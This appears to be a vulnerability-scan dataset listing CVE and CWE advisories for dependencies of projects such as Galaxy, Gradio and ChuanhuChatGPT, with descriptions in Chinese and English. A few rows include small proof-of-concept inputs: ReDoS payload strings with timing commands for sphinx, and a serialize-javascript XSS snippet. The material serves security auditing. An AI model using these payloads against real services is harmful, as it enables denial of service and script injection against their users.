GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
GaiZhenbiao_ChuanhuChatGPT,llama-cpp-python,,True,,CWE-94,2023-12-20,"## Overview
[llama-cpp-python](https://pypi.org/project/llama-cpp-python) is a Python bindings for the llama.cpp library

Affected versions of this package are vulnerable to Arbitrary Code Execution due to improper `Llama._create_completion` suffix parameter check, allows an attacker to send string-like object which could actually lead to exploitation of this vulnerability.
## Remediation
Upgrade `llama-cpp-python` to version 0.2.12 or higher.
## References
- [GitHub Commit](https://github.com/abetlen/llama-cpp-python/pull/854/commits/474474d062ed0641efc9253c49a13631a5d57576)
- [GitHub PR](https://github.com/abetlen/llama-cpp-python/pull/854)
- [Vulnerable Code](https://github.com/tangledgroup/llama-cpp-python-exploit/blob/f99baf1e66b9fa79987c594179ac93eadfb2ca97/exploit.py#L45)
",2,0
galaxyproject_galaxy,sentry-sdk,,True,,CWE-362,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Race Condition such that in some cases the `start_child` method can be called on the Transaction which `_span_recorder` has been already deleted from the instance.
## Remediation
Upgrade `sentry-sdk` to version 1.4.1 or higher.
## References
- [GitHub Commit](https://github.com/getsentry/sentry-python/commit/44b18cb15ba8485e4950be7f50884c645795e0f0)
- [GitHub PR](https://github.com/getsentry/sentry-python/pull/1203)
- [GitHub Release](https://github.com/getsentry/sentry-python/releases/tag/1.4.1)
",3,0
galaxyproject_galaxy,sentry-sdk,,True,CVE-2023-28117,CWE-201 CWE-209,2023-03-21,"Mobileiron Sentry是美国思可信（Mobileiron）公司的一款智能网关产品。
Sentry 1.14.0之前版本存在安全漏洞。攻击者利用该漏洞泄露敏感的cookie值。",2,0
galaxyproject_galaxy,sentry-sdk,,True,CVE-2024-40647,CWE-200,2024-07-18,"sentry-python是Sentry开源的一个应用程序监控软件的 Python 软件开发工具包。
sentry-python 2.8.0之前版本存在安全漏洞，该漏洞源于环境变量无意暴露在子流程中。",4,0
galaxyproject_galaxy,boto3,,True,,CWE-200,2017-03-10,"## Overview
[`boto3`](https://pypi.python.org/pypi/boto3) is the AWS SDK for Python.

Affected versions of this package are vulnerable to Information Exposure due to logging all of the bytes uploaded when the logger is set to the `INFO` level.

## Remediation
Upgrade `boto3` to version 1.4.5 or higher.

## References
- [GitHub Issue](https://github.com/boto/boto3/issues/1017)
- [GitHub Commit](https://github.com/boto/boto3/commit/5a4396a4e0d1b337c081cb4095e5255da915198e)",4,0
galaxyproject_galaxy,urllib3,1.26.20,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
galaxyproject_galaxy,future,1.0.0,True,CVE-2025-50817,CWE-77,2025-08-14,Python-Future 是由 Python Charmers 开源的一个用于实现 Python 2 和 Python 3 兼容的工具库。该库的主要作用是提供一个统一的接口，使得开发者能够在不同 Python 版本中无缝运行代码。在 Python-Future 1.0.0 版本中，存在一个严重的安全漏洞。漏洞的成因是模块在加载时会自动导入名为 test.py 的文件，无论该文件是否在当前目录或 sys.path 路径中存在。这种行为为攻击者提供了一个可利用的途径：如果攻击者能够向服务器写入恶意的 test.py 文件，便可通过该文件的导入机制执行任意代码。这种漏洞属于典型的代码执行问题，根本原因在于模块未对导入路径和文件名进行严格校验。,2,0
galaxyproject_galaxy,starlette,0.48.0,True,CVE-2025-62727,CWE-407,2025-10-28,"Starlette 是一个轻量级的 ASGI 框架和工具包，主要用于构建基于 Python 的异步 Web 服务。它支持高性能的异步请求处理，并提供如路由、中间件、静态文件服务等功能。

此漏洞出现在 Starlette 的 FileResponse 组件中，该组件用于处理文件响应，例如通过 StaticFiles 或直接使用 FileResponse 提供静态文件服务时。
在 0.49.1 版本之前，未经身份验证的攻击者可以发送一个精心构造的 HTTP Range 头，触发 FileResponse 的 Range 头解析和合并逻辑中的二次时间复杂度处理。具体来说，FileResponse 的 `_parse_range_header()` 方法在解析多范围请求时，使用的正则表达式存在 O(n^2) 的复杂度，导致处理时间显著增加。此外，合并逻辑通过扫描整个结果列表进一步放大了这种复杂度，从而使每个请求能够引发 CPU 资源的耗尽，导致拒绝服务攻击。
该漏洞的技术细节包括：
- 使用 `_RANGE_PATTERN` 正则表达式解析 Range 头部时，处理时间复杂度为 O(n^2)。
- 合并范围时，遍历结果列表进行比较，也会导致 O(n^2) 的处理时间。
攻击者可以通过构造包含多个小的、不重叠的范围或特定数字子串的 Range 头，最大化处理复杂度。
该问题影响所有使用 FileResponse 或 StaticFiles 提供文件服务的 Starlette 应用程序，同时也间接影响基于 Starlette 构建的框架，例如 FastAPI。",2,1
galaxyproject_galaxy,urllib3,1.26.20,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
galaxyproject_galaxy,sphinx,,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
galaxyproject_galaxy,sphinx,,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
galaxyproject_galaxy,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
galaxyproject_galaxy,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
galaxyproject_galaxy,twine,,True,,CWE-601,2015-01-30,"## Overview
[`twine`](https://pypi.python.org/pypi/twine) is a Collection of utilities for interacting with PyPI.

Affected versions of this package are vulnerable to Open Redirection when uploading a library to pypi.

## References
- [GitHub Issue](https://github.com/pypa/twine/issues/92)
- [GitHub PR](https://github.com/pypa/twine/pull/94)
- [GitHub Commit](https://github.com/pypa/twine/commit/29e85757559154e919c9fe0a7f5803a425628855)
",3,0
galaxyproject_galaxy,vite,6.3.6,False,CVE-2025-62522,CWE-22,2025-10-20,Vite 是一个用于 JavaScript 的前端工具框架，提供快速的开发环境和构建功能。此漏洞影响 Vite 的开发服务器，当运行在 Windows 平台时，如果开发服务器通过 --host 或 server.host 配置选项显式暴露在网络上，攻击者可以通过构造以反斜杠（\）结尾的 URL 来绕过 server.fs.deny 配置，从而访问原本被禁止的敏感文件（如 .env 文件）。漏洞的根本原因是文件系统路径处理不当，导致路径检查未正确处理反斜杠（\），从而允许访问受限制的文件。,3,2
galaxyproject_galaxy,vite,4.5.14,True,CVE-2025-58751,CWE-22 CWE-200 CWE-284,2025-09-08,Vite是一个JavaScript的前端工具框架，主要用于快速构建和开发现代Web应用。在版本7.1.5、7.0.7、6.3.6和5.4.20之前，Vite存在路径遍历漏洞。当某些文件名与public目录名称相同且public目录中存在符号链接时，该漏洞导致绕过server.fs配置限制，允许攻击者访问本应受限制的文件。在典型部署中，Vite开发服务器通常用于提供静态资源以及支持热更新功能。漏洞成因为sirv库在public目录的路径校验逻辑中使用了字符串的startsWith函数，该函数未正确处理路径标准化后的结果，导致攻击者可以通过'../'构造路径访问父目录中的敏感文件，例如'../private.txt'。,4,-2
galaxyproject_galaxy,vite,4.5.14,True,CVE-2025-62522,CWE-22,2025-10-20,Vite 是一个用于 JavaScript 的前端工具框架，提供快速的开发环境和构建功能。此漏洞影响 Vite 的开发服务器，当运行在 Windows 平台时，如果开发服务器通过 --host 或 server.host 配置选项显式暴露在网络上，攻击者可以通过构造以反斜杠（\）结尾的 URL 来绕过 server.fs.deny 配置，从而访问原本被禁止的敏感文件（如 .env 文件）。漏洞的根本原因是文件系统路径处理不当，导致路径检查未正确处理反斜杠（\），从而允许访问受限制的文件。,3,2
galaxyproject_galaxy,vite,4.5.14,True,CVE-2025-58752,CWE-23 CWE-200 CWE-284,2025-09-08,Vite 是一个用于构建 JavaScript 前端应用的工具框架，其主要功能包括快速开发服务器、模块热替换（HMR）、构建优化等。在版本 7.1.5、7.0.7、6.3.6 和 5.4.20 之前，Vite 的 `server.fs` 设置未对 HTML 文件生效，导致任意 HTML 文件能够被访问。具体来说，Vite 的开发服务器在暴露到网络时（通过 --host 参数或 server.host 配置项显式暴露），且使用默认的 `appType: 'spa'` 或 `appType: 'mpa'` 时，可能出现漏洞。此外，Vite 的预览服务器也允许访问未在输出目录中的 HTML 文件。这一问题的根本原因在于中间件 `serveStaticMiddleware` 和 `htmlFallbackMiddleware`、`indexHtmlMiddleware` 未对请求的文件路径执行必要的允许或拒绝规则校验。,4,-2
galaxyproject_galaxy,moment,2.20.1,False,CVE-2022-31129,CWE-400 CWE-1333,2022-07-06,Moment.js 是一个广泛使用的 JavaScript 库，用于处理日期和时间操作。该库在处理 RFC2822 日期格式时存在解析算法的低效问题，具体体现为 preprocessRFC2822() 函数的平方复杂度，从而导致正则表达式拒绝服务（ReDoS）漏洞。由于 Moment.js 对字符串进行解析时使用了低效的正则表达式，当遇到非常大或复杂的字符串，尤其是来源于不受信任的用户输入时，由于正则表达式的设计不合理，导致灾难性回溯行为，从而消耗大量的 CPU 资源，并可能使服务无法响应。,2,0
galaxyproject_galaxy,ag-grid-community,30.2.1,False,CVE-2024-38996,CWE-1321,2024-07-01,ag-grid-community 和 ag-grid-enterprise 在版本31.3.2中发现了一个通过 _.mergeDeep 函数引起的原型污染漏洞。该漏洞使得攻击者能够通过注入任意属性来执行任意代码或导致拒绝服务（DoS）。,2,2
galaxyproject_galaxy,moment,2.20.1,False,CVE-2022-31129,CWE-400 CWE-1333,2022-07-06,Moment.js 是一个广泛使用的 JavaScript 库，用于处理日期和时间操作。该库在处理 RFC2822 日期格式时存在解析算法的低效问题，具体体现为 preprocessRFC2822() 函数的平方复杂度，从而导致正则表达式拒绝服务（ReDoS）漏洞。由于 Moment.js 对字符串进行解析时使用了低效的正则表达式，当遇到非常大或复杂的字符串，尤其是来源于不受信任的用户输入时，由于正则表达式的设计不合理，导致灾难性回溯行为，从而消耗大量的 CPU 资源，并可能使服务无法响应。,2,0
galaxyproject_galaxy,serialize-javascript,6.0.1,False,,CWE-79,2024-01-09,"## Overview
[serialize-javascript](https://www.npmjs.com/package/serialize-javascript) is a package to serialize JavaScript to a superset of JSON that includes regular expressions and functions.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to unsanitized URLs. An Attacker can introduce unsafe `HTML` characters through non-http `URLs`.
## PoC
```js
const serialize = require('serialize-javascript');

let x = serialize({
    x: new URL(""x:</script>"")
});

console.log(x)
```
## Details

A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.

## Remediation
Upgrade `serialize-javascript` to version 6.0.2 or higher.
## References
- [GitHub Commit](https://github.com/yahoo/serialize-javascript/commit/f27d65d3de42affe2aac14607066c293891cec4e)
- [GitHub Issue](https://github.com/yahoo/serialize-javascript/issues/172)
",3,0
galaxyproject_galaxy,serialize-javascript,6.0.1,False,CVE-2024-11831,CWE-79,2025-02-10,"Serialize JavaScript是Yahoo开源的一个将 JavaScript 序列化为包含正则表达式和函数的 JSON 超集。
Serialize JavaScript存在跨站脚本漏洞，该漏洞源于没有正确清理某些输入。攻击者利用该漏洞可以注入恶意代码。",3,0
galaxyproject_galaxy,ag-grid-community,30.2.1,True,CVE-2024-38996,CWE-1321,2024-07-01,ag-grid-community 和 ag-grid-enterprise 在版本31.3.2中发现了一个通过 _.mergeDeep 函数引起的原型污染漏洞。该漏洞使得攻击者能够通过注入任意属性来执行任意代码或导致拒绝服务（DoS）。,2,2
galaxyproject_galaxy,braces,3.0.2,False,CVE-2024-4068,CWE-1050 CWE-400,2024-05-13,NPM 包 braces 3.0.3 之前的版本未能限制它可以处理的字符数量，这可能导致内存耗尽。在 lib/parse.js 文件中，如果恶意用户输入“不平衡的大括号”，解析过程会进入循环，导致程序开始分配堆内存而不释放它。最终，JavaScript 堆限制被达到，程序将崩溃。,2,2
galaxyproject_galaxy,loader-utils,2.0.2,False,CVE-2022-37601,CWE-1321,2022-10-12,"loader-utils是webpack开源的一个用于 webpack 加载器的实用程序。
webpack loader-utils 2.0.0版本存在安全漏洞，该漏洞源于parseQuery.js的parseQuerys函数中发现包含原型污染漏洞。",1,2
galaxyproject_galaxy,on-headers,1.0.2,False,CVE-2025-7339,CWE-241,2025-07-17,"on-headers是jshttp开源的一个应用软件。
on-headers 1.1.0版本存在安全漏洞，该漏洞源于传递数组到response.writeHead时可能无意修改响应头。",3,0
galaxyproject_galaxy,micromatch,4.0.5,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
galaxyproject_galaxy,loader-utils,1.4.0,False,CVE-2022-37601,CWE-1321,2022-10-12,"loader-utils是webpack开源的一个用于 webpack 加载器的实用程序。
webpack loader-utils 2.0.0版本存在安全漏洞，该漏洞源于parseQuery.js的parseQuerys函数中发现包含原型污染漏洞。",1,2
galaxyproject_galaxy,cookie,0.5.0,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
goauthentik_authentik,async,3.2.4,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
goauthentik_authentik,async,3.2.2,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
gradio-app_gradio,pytest-xdist,,True,,CWE-362,2023-12-06,"## Overview
[pytest-xdist](https://pypi.org/project/pytest-xdist) is a pytest xdist plugin for distributed testing, most importantly across multiple CPUs

Affected versions of this package are vulnerable to Race Condition in the `looponfail` mode where a concurrent file removal could cause a crash.
## Remediation
Upgrade `pytest-xdist` to version 1.6 or higher.
## References
- [GitHub Commit](https://github.com/pytest-dev/pytest-xdist/commit/d9c5f18478db6d1d1584f53ce1b4c1c4feb43f9a)
",3,0
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,>=4.47.0,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
